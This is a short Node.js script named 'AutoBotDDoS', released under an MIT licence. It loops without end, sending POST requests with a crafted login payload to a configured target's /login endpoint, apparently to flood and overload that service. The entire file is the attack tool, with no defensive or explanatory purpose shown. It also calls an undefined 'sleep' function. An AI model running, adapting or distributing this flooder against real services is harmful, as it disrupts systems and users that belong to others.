// AutoBotDDoS (2024)
// Copyright (c) 2024 Rui Reogo
// Licensed under the MIT License

// import necessary things
const config = require('./config.json');
const utils = require('./utils');
const axios = require('axios');

const run = async () => {
  const {
    AUTOBOT_URL,
    TIME_INTERVAL
  } = config;
  const xurl = AUTOBOT_URL + "/login";

  while (true) {
    const state = utils.getState();
    axios.post(xurl, {
      state,
      commands: [],
      prefix: '/',
      admin: 69
    });

    await sleep(TIME_INTERVAL);
  };
};

run();